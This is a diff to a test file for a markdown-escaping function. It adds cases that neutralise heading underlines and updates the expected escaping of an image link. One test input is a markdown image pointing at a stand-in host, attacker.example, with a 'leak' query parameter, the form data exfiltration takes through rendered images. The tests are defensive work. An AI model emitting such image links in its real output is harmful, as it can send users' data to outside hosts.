@@ -4,7 +4,7 @@ import { codeSpan, escapeMarkdown, markdownLinkDestination } from '../src/system
 describe('escapeMarkdown', () => {
   it('neutralises an image that would load a remote URL', () => {
     expect(escapeMarkdown('![](https://attacker.example/b.png?u=leak)')).toBe(
-      '\\!\\[\\]\\(https://attacker\\.example/b\\.png?u=leak\\)',
+      '\\!\\[\\]\\(https://attacker\\.example/b\\.png?u\\=leak\\)',
     );
   });
 
@@ -16,6 +16,11 @@ describe('escapeMarkdown', () => {
 
   it('collapses line breaks so an author name cannot open a heading', () => {
     expect(escapeMarkdown('Bob**\n\n# Heading')).toBe('Bob\\*\\* \\# Heading');
+  });
+
+  it('escapes the lines that would underline the line above into a heading', () => {
+    expect(escapeMarkdown('====')).toBe('\\=\\=\\=\\=');
+    expect(escapeMarkdown('---')).toBe('\\-\\-\\-');
   });
 
   it('neutralises the theme-icon syntax', () => {
